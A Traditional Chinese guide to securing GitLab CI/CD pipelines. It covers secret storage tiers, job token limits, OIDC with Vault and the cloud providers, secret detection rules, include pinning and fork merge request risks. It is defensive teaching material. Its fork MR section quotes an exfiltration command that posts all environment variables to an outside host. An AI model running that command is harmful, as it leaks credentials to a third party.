🗺️ 安全威脅模型

CI/CD pipeline 是攻擊者的高價值目標:一旦攻破,能竊取密鑰、汙染部署、植入後門。典型威脅:

🕵️ Secret 外洩

程式碼內寫死密碼、log 輸出 secret、CI 變數被偷

🎭 供應鏈攻擊

include 的第三方檔案被改、Component 被注入惡意程式

🍴 Fork MR 攻擊

外部貢獻者藉 MR 執行惡意程式、偷取 parent project 的 secret

🔓 Token 濫用

CI_JOB_TOKEN 可存取非預期的專案或 API

⚡ Runner 逃逸

privileged runner 被惡意 job 利用;job 橫向移動到其他 job

📦 構建產物污染

build 出的 image 含後門、相依套件被 typosquatting

架構視角縱深防禦

單一機制不可靠,要多層防護:

訊息/身分    Protected branch + protected variable + protected runner
   ↓
傳輸        OIDC + short-lived credentials(非長期 secret)
   ↓
儲存        External Secrets Manager(Vault / KMS)
   ↓
使用        Mask + Environment scope + Job Token limit
   ↓
偵測        Secret Push Protection + Pipeline Secret Detection
   ↓
審查        Review fork MR + Pin include/component 版本

🔐 1. Secrets 管理的層級

Quick Start安全等級由低到高

方式安全性適用
YAML 明文❌ 最差禁用
UI Variables(masked)⚠️ 基本低敏感 config
UI Variables(masked + protected + scoped)✅ 中一般 secret
Secure Files✅ 中檔案類 secret(憑證、keystore)
External Secrets(Vault / KMS)✅✅ 最高生產密鑰、合規要求
🔴 核心原則
最敏感的 secret 應放在 External Secrets Manager,不是 CI Variables。 CI Variables 的值存在 GitLab 專案設定裡,有 Settings 權限的人都能看;可以被同名變數覆蓋,難稽核實際用值。

SRE 實務敏感度分級建議

等級範例存放
PublicAPI endpoint URL、版本號YAML
InternalDev / staging 連線字串UI Variable
ConfidentialRegistry token、Slack webhookUI Variable + masked + protected
SecretProd DB password、AWS keyVault + OIDC,或 environment-scoped UI variable
Top SecretSigning key、加密主 keyVault + HSM,嚴格 audit

🎟️ 2. CI_JOB_TOKEN 管理

Quick StartCI_JOB_TOKEN 是什麼?

每個 job 自動拿到一個短期 token,有效範圍是 job 執行期間。用途:

  • 登入 Container Registry(push / pull image)
  • 呼叫 GitLab API(讀 MR、建 issue、觸發下游 pipeline)
  • 跨專案拉 artifact
  • 登入 Package Registry(npm、PyPI、Maven)

Quick Start基本使用

build-and-push:
  image: docker:24
  services: [docker:24-dind]
  script:
    # 用 CI_JOB_TOKEN 登入 registry
    - echo "$CI_REGISTRY_PASSWORD" | docker login -u "$CI_REGISTRY_USER" --password-stdin "$CI_REGISTRY"
    - docker build -t "$CI_REGISTRY_IMAGE:$CI_COMMIT_SHORT_SHA" .
    - docker push "$CI_REGISTRY_IMAGE:$CI_COMMIT_SHORT_SHA"
    # CI_REGISTRY_PASSWORD = CI_JOB_TOKEN

SRE 實務Token Access 限制

⚠️ 預設 CI_JOB_TOKEN 可以存取所有 public project。惡意專案可利用這點攻擊你的 project。

路徑:Project → Settings → CI/CD → Token Access

  • ✅ Limit access to this project:勾選
  • 把信任的專案加到 Allow listed projects
  • 也可加信任的 group(讓該 group 所有 project 能存取)

SRE 實務跨專案使用 Job Token

# Project A 的 job 呼叫 Project B 的 API
curl --header "JOB-TOKEN: $CI_JOB_TOKEN" \
  "https://gitlab.example.com/api/v4/projects/b-id/jobs/artifacts/main/download?job=build"

# 觸發 Project B 的 pipeline
curl --request POST \
  --header "JOB-TOKEN: $CI_JOB_TOKEN" \
  "https://gitlab.example.com/api/v4/projects/b-id/trigger/pipeline"

# 若 Project B 有啟用 Limit access,必須先把 Project A 加到 Allow listed

架構視角Token Scope(Job Token Permissions)

新版 GitLab(17+)支援更細粒度的 Job Token 權限:

# Project → Settings → CI/CD → Job token permissions
# 可以設定 CI_JOB_TOKEN 能做的 API 動作範圍:
#   - read_api / read_repository / read_registry
#   - write_repository / write_registry
#   - 各 scope 單獨開關

最小權限原則:只開真正需要的 scope。

🗂️ 3. Secure Files

Quick Start用途

Secure Files 是專案層級儲存機密檔案的機制,比 File type variable 更適合大檔案:

  • Android keystore(.jks / .keystore)
  • iOS provisioning profile + signing certificate
  • GPG 私鑰
  • TLS 憑證

路徑:Project → Settings → CI/CD → Secure Files

Quick Start使用範例

sign-apk:
  image: alpine:latest
  before_script:
    # 下載 Secure Files
    - apk add curl
    - curl --silent "https://gitlab.com/gitlab-org/incubation-engineering/mobile-devops/download-secure-files/-/raw/main/installer" | bash
    # 下載完的檔案在 .secure_files/ 資料夾
  script:
    - jarsigner -keystore .secure_files/release.keystore \
        -storepass "$KEYSTORE_PASS" \
        app-release-unsigned.apk \
        release-key

SRE 實務Secure Files 優勢

  • 最多 100 個檔案,每個最大 5MB
  • 可設 Permanent(不可覆寫,保護歷史版本)
  • 比 File type Variable 更好管(有 UI 列表)
  • 跨 job 可用(不用 artifact 傳遞)

限制:只能在 Project 層,不能 Group / Instance 共用。

🎫 4. OIDC(ID Token)

Quick StartOIDC 解決什麼問題?

傳統做法:把 AWS key / GCP service account 存成 CI Variable。問題:

  • 長期存在,一旦洩漏影響大
  • GCP JSON key 沒辦法 mask(格式不符 mask 規則)
  • 無法細粒度控制「哪個 job 可以拿」

OIDC 方案:GitLab 發行短期 JWT 給 job,由雲端 IDP 驗證後換成短期 access token(通常 1 小時)。無須存長期 credential。

Quick Startid_tokens 關鍵字

job:
  id_tokens:
    AWS_ID_TOKEN:            # 變數名稱自訂
      aud: https://aws.amazon.com   # 雲端驗證的 audience
  script:
    - echo "$AWS_ID_TOKEN"   # 印出 JWT(應該用於換 token,不是 echo)

SRE 實務JWT 中的常見 claims

Claim意義
issGitLab URL(簽發者)
sub專案路徑 + ref(識別身分)
aud你指定的 audience
project_id專案 ID
project_path專案路徑
namespace_idgroup ID
ref分支 / tag 名
ref_typebranch / tag
ref_protected是否 protected
user_login觸發者 username
environmentjob 對應的 environment(若有)
exp過期時間(通常 5 分鐘)

架構視角雲端信任策略

雲端設定 trust policy 時,應該依 claims 限制:

// AWS IAM trust policy 範例
{
  "Effect": "Allow",
  "Principal": {
    "Federated": "arn:aws:iam::123456789012:oidc-provider/gitlab.example.com"
  },
  "Action": "sts:AssumeRoleWithWebIdentity",
  "Condition": {
    "StringEquals": {
      "gitlab.example.com:aud": "https://aws.amazon.com",
      "gitlab.example.com:project_path": "my-group/my-project"
    },
    "StringLike": {
      "gitlab.example.com:ref": "refs/heads/main"
    },
    "Bool": {
      "gitlab.example.com:ref_protected": "true"
    }
  }
}

必要限制至少 project_path + ref_protected,否則任何 GitLab 專案都能 assume 這個 role(史上 CircleCI 事故教訓)。

🏦 5. HashiCorp Vault 整合

Quick Startsecrets 關鍵字

job:
  id_tokens:
    VAULT_ID_TOKEN:
      aud: https://vault.example.com
  secrets:
    DB_PASSWORD:
      vault: production/db/password@ops   # path@engine
      file: false                          # 當作 env var(預設 true 是檔案)
      token: $VAULT_ID_TOKEN
  script:
    - echo "Using $DB_PASSWORD"            # 會被 mask

SRE 實務Vault 伺服器端設定

# 1. 啟用 JWT auth method
vault auth enable jwt

# 2. 告訴 Vault 從哪裡驗證 JWT
vault write auth/jwt/config \
  oidc_discovery_url="https://gitlab.example.com" \
  bound_issuer="gitlab.example.com"

# 3. 建立 role(限定特定專案 / 分支才能拿)
vault write auth/jwt/role/myproject-prod - <

SRE 實務多個 engine

job:
  id_tokens:
    VAULT_ID_TOKEN:
      aud: https://vault.example.com
  secrets:
    DB_PASSWORD:
      vault: production/db/password@ops   # kv-v2(預設)

    JFROG_TOKEN:
      vault:
        engine:
          name: generic       # 支援 kv-v1, AWS, Artifactory 等
          path: artifactory
        path: production/jfrog
        field: access_token

    # 動態 AWS credential(Vault AWS engine)
    AWS_ACCESS_KEY_ID:
      vault:
        engine: {name: aws, path: aws}
        path: creds/deploy-role
        field: access_key

架構視角Vault + GitLab 架構

┌────────────┐   1. 跑 job      ┌────────────┐
│   GitLab   │────────────────▶│   Runner   │
└────────────┘                  └─────┬──────┘
     ▲                                │
     │ 4. 發 JWT(ID token)           │ 2. 要 secret
     │                                ▼
     │                          ┌────────────┐
     └──────────────────────────│   Vault    │
        3. Vault 驗證 JWT       └────────────┘
           (OIDC discovery)

優點:
- GitLab 不存任何 production secret
- Vault 有完整 audit log
- JWT 短期有效,洩漏影響小
- 支援 dynamic secrets(每次產新的 DB user)

☁️ 6. 雲端整合(AWS / GCP / Azure)

Quick StartAWS(STS AssumeRoleWithWebIdentity)

assume-aws-role:
  image: amazon/aws-cli
  id_tokens:
    GITLAB_OIDC_TOKEN:
      aud: https://aws.amazon.com
  script:
    - >
      export $(printf "AWS_ACCESS_KEY_ID=%s AWS_SECRET_ACCESS_KEY=%s AWS_SESSION_TOKEN=%s"
      $(aws sts assume-role-with-web-identity
      --role-arn $ROLE_ARN
      --role-session-name "GitLabRunner-$CI_PROJECT_ID-$CI_PIPELINE_ID"
      --web-identity-token $GITLAB_OIDC_TOKEN
      --duration-seconds 3600
      --query 'Credentials.[AccessKeyId,SecretAccessKey,SessionToken]'
      --output text))
    - aws s3 ls

SRE 實務GCP(Workload Identity Federation)

deploy-gcp:
  image: google/cloud-sdk:latest
  id_tokens:
    GCP_ID_TOKEN:
      aud: //iam.googleapis.com/projects/123/locations/global/workloadIdentityPools/gitlab-pool/providers/gitlab
  script:
    - echo "$GCP_ID_TOKEN" > token.json
    - |
      gcloud iam workload-identity-pools create-cred-config \
        "projects/123/locations/global/workloadIdentityPools/gitlab-pool/providers/gitlab" \
        --service-account="gitlab-ci@my-project.iam.gserviceaccount.com" \
        --service-account-token-lifetime-seconds=600 \
        --output-file=cred.json \
        --credential-source-file=token.json
    - gcloud auth login --cred-file=cred.json
    - gcloud storage cp app.tar.gz gs://my-bucket/

SRE 實務Azure(Federated Credentials)

deploy-azure:
  image: mcr.microsoft.com/azure-cli
  id_tokens:
    AZURE_OIDC_TOKEN:
      aud: api://AzureADTokenExchange
  script:
    - az login --service-principal \
        -u $AZURE_CLIENT_ID \
        -t $AZURE_TENANT_ID \
        --federated-token $AZURE_OIDC_TOKEN
    - az deployment group create ...

架構視角OIDC vs 長期 credential 比較

長期 credential(IAM user key)OIDC
credential 壽命永久(需人手輪替)自動短期(1 小時)
洩漏影響災難性有限(快過期)
Audit 可能性低(不知誰用)高(含 job/user 資訊)
細粒度權限IAM policyIAM policy + JWT claims
設定複雜度簡單較複雜(需 trust 設定)
推薦度❌ 避免✅ 強烈推薦

🔍 7. Secret Detection

Quick Start三種偵測層次

層次時機層級
Secret Push Protectionpush 時就擋(在 server 端)Ultimate
Pipeline Secret DetectionMR / pipeline 跑Free(Ultimate 有 MR widget)
Client-side Secret DetectionWeb IDE 編輯時即時提示Ultimate

Quick Start啟用 Pipeline Secret Detection

# 方式 1:include template
include:
  - template: Security/Secret-Detection.gitlab-ci.yml

# 方式 2:用 Component
include:
  - component: $CI_SERVER_FQDN/components/secret-detection/secret-detection@1

SRE 實務啟用 Push Protection(Ultimate)

路徑:Project → Settings → Secure → Secret push protection

  • ✅ 勾選啟用
  • push 時若偵測到 secret,整個 push 被拒絕
  • 使用者可用 [skip secret push protection] commit message 跳過(僅在必要時)

SRE 實務Secret 洩漏應變 5 步驟

🔴 發現 secret 外洩時:
  1. 撤銷:立即到 AWS / GitLab / DB 把該 token 作廢
  2. 調查:查 audit log 看是否已被使用
  3. 輪替:發新 token,更新所有消費端
  4. 通知:若影響正式環境,通知安全團隊
  5. 清歷史(最後):git filter-repo 從 Git 歷史刪除
⚠️ 先撤銷,再清歷史。token 已可能被 clone 走了,清 Git 歷史救不回。

架構視角Custom Ruleset(Ultimate)

預設偵測常見 token(AWS、GCP、Stripe 等)。若貴組織有自訂 token,可加偵測規則:

# .gitlab/secret-detection-ruleset.toml
[[rules]]
description = "Company-specific API key"
id = "company-api-key"
regex = '''mycorp-api-[a-zA-Z0-9]{32}'''
keywords = ["mycorp-api-"]

🔗 8. 供應鏈安全(include / components)

Quick Start核心原則

⚠️ include 的外部 YAML 可以執行任意程式碼。若被汙染,你的 pipeline 就被挾持。

SRE 實務安全 include

# ✅ 推薦:釘 commit SHA
include:
  - project: 'my-group/ci-templates'
    ref: 8b0c8b318857c8211c15c6643b0894345a238c4e
    file: '/templates/build.yml'

# ✅ 可接受:釘 protected tag
include:
  - project: 'my-group/security'
    ref: v2.1.0
    file: '/templates/scan.yml'

# ✅ Component 釘完整版本
include:
  - component: $CI_SERVER_FQDN/my-group/components/docker-build@1.2.3

# ❌ 避免:用 branch 名(可被改)
include:
  - project: 'my-group/ci-templates'
    ref: main                         # ← 隨時可能變
    file: '/templates/build.yml'

# ❌ 避免:remote 檔案
include:
  - remote: 'https://example.com/ci.yml'   # ← 外部網站可變造

# ❌ 避免:版本範圍
include:
  - component: external/scan@~latest   # ← 可能被推新版本攻擊

架構視角第三方元件審查

用 Catalog 上的第三方 Component 前:

  • 讀原始碼,看 script 做什麼
  • 檢查 token / credential 用法是否合理
  • 釘死完整版本(不用 ~latest)
  • 只給最小必要權限
  • 定期 review 升級 changelog
  • 考慮 fork 到內部 catalog(多一層審查)

架構視角Pinned versions 實務

# Node 版本(避免 supply chain)
build:
  script:
    - nvm install 20.11.1      # 釘完整版本
    - nvm use 20.11.1
    - npm ci                    # 用 lock file,不用 npm install
    - npm run build

# Docker base image
FROM node:20.11.1-alpine3.19  # ✅ 完整 tag
# FROM node:latest            # ❌ 絕對不用

🍴 9. Fork MR 安全

Quick StartFork MR 的風險

外部貢獻者的 fork MR 有兩種執行模式:

模式runner / 變數來源風險
預設(在 fork 端)Fork project 自己的 runner / variable✅ 安全(拿不到 parent 資料)
在 parent 端(手動觸發)Parent project 的 runner / variable⚠️ Fork 的惡意 script 可偷 parent secret
🔴 真實案例
過去多個開源專案因 fork MR 的 CI 腳本被改,執行 curl -d @/env external.com 把所有環境變數外傳,造成 AWS key 洩漏。

SRE 實務防範措施

  1. 使用 Protected Variable — fork MR 非 protected branch,拿不到
  2. 使用 Environment scope — production scope 的 variable 不給 test job
  3. 謹慎手動觸發 — 點 "Run pipeline" 前 review 程式變更
  4. 不信任的 fork runner — 改在 parent 端跑(但要先 review)

SRE 實務設定層面

路徑:Project → Settings → CI/CD → General pipelines

  • Pipelines for fork merge requests:是否允許在 parent 跑
  • 也可用 API 完全關閉 ci_allow_fork_pipelines_to_run_in_parent_project

架構視角review workflow

高風險專案建議流程:

  1. 外部貢獻者開 MR
  2. CI 在 fork 端跑基本檢查(lint、test)
  3. Maintainer review 程式變更
  4. 若無問題,手動觸發「在 parent 跑」拿 production 資源測
  5. review 通過後 merge

⚡ 速查表

🏆 Pipeline Security 20 條 Checklist

  • Secret 不寫在 YAML
  • UI Variables 都 masked + protected
  • Production secret 用 Vault / KMS,走 OIDC
  • Environment scope 隔離多環境 secret
  • Protected branch + Protected Runner + Protected Variable 三層保護
  • CI_JOB_TOKEN 限制只能存取本專案(或白名單)
  • Include 檔案釘 commit SHA 或 protected tag
  • 第三方 Component 釘完整版本
  • Docker image 釘完整 tag(不用 latest)
  • Secret Push Protection 啟用(Ultimate)
  • Pipeline Secret Detection 在所有專案跑
  • Fork MR 預設在 fork 端跑
  • 手動觸發 parent pipeline 前必先 review
  • Runner 非 privileged(除非必要)
  • Runner 分 trust 等級(protected / general)
  • Deployment job 有 environment 與 resource_group
  • Secret 洩漏應變流程已演練
  • OIDC trust policy 限制 project_path + ref_protected
  • Webhook outbound 不許連 local network
  • 定期稽核 CI variables 使用

🎯 Secret 存放決策樹

要存放的是?
├─ 一般 config(非敏感)
│  └─ YAML variables 或 UI Variables
│
├─ 敏感但非生產(dev/staging secret)
│  └─ UI Variables(masked + protected)
│
├─ 生產密碼 / 雲端 key
│  ├─ 有 Vault / KMS?
│  │  └─ ✅ External Secrets + OIDC(最佳)
│  └─ 沒 Vault
│     └─ UI Variables(masked + protected + environment scope)
│
├─ 檔案類(keystore、SSL cert)
│  └─ Secure Files
│
└─ 雲端身分驗證
   └─ OIDC(不要用長期 key)

🆘 安全事故應變

事故立即動作
Secret push 到 repo1. 撤銷 token 2. 輪替 3. 最後才清 Git 歷史
CI_JOB_TOKEN 疑似洩漏該 pipeline 已結束即過期,但重看 Audit
Fork MR 可能偷了 secret撤銷所有 parent secret、清查 audit
Runner 被攻破下線 runner、輪替 token、重建
惡意 Component 被 include移除 include、清查影響、開事故報告
